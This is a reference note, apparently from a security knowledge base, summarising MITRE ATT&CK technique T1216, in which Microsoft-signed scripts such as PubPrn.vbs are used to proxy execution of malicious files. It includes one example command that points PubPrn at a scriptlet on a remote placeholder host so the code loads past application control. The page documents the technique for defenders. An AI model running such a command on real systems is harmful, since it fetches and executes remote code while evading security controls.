Tactics: [[DEFENSE_EVASION]]
Tags: #mitre/attack/techniques/T1216  

# Signed Script Proxy Execution - T1216
---
## Description
[more on T1216](https://attack.mitre.org/techniques/T1216)

Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.[1](https://github.com/api0cradle/UltimateAppLockerByPassList)

---
## Sub-Techniques

#### PubPrn - T1216.001
[more on T1216.001](https://attack.mitre.org/techniques/T1216/001)

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [[T1059_Command and Scripting Interpreter#Visual Basic - T1059 005|Visual Basic (T1059.005)]] script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and is commonly executed through the [[T1059_Command and Scripting Interpreter#Windows Command Shell - T1059 003|Windows Command Shell (T1059.003)]] via `Cscript.exe`. For example, the following code publishes a printer within the specified domain: `cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com` .[1](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/) To do so, adversaries may set the second `script:` parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is `pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct`. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), `PubPrn.vbs` has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to `LDAP://`, vice the `script:` moniker which could be used to reference remote code via HTTP(S).



